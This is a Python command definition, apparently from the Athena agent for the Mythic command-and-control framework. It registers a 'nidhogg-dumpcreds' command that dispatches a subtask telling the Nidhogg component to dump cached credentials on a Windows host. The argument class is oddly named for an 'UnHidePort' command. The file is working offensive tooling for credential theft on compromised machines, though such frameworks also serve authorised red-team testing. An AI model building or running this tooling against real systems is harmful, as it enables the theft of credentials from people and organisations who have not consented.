from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from ..athena_utils.bof_utilities import *

class NidhoggUnHidePortArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)

class NidhoggDumpCredsCommand(CoffCommandBase):
    cmd = "nidhogg-dumpcreds"
    needs_admin = False
    help_cmd = """nidhogg-dumpcreds"""
    description = "Dumps credentials from cache using Nidhogg"
    version = 1
    script_only = True
    supported_ui_features = []
    author = "@idov31"
    argument_class = NidhoggUnHidePortArguments
    attackmapping = []
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False,
        load_only=True
    )
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            taskData.Task.ID, 
            CommandName="nidhogg",
            SubtaskCallbackFunction="coff_completion_callback",
            Params=json.dumps({
                "command": "dumpcreds",
            }),
            Token=taskData.Task.TokenID,
        ))        

        # We did it!
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass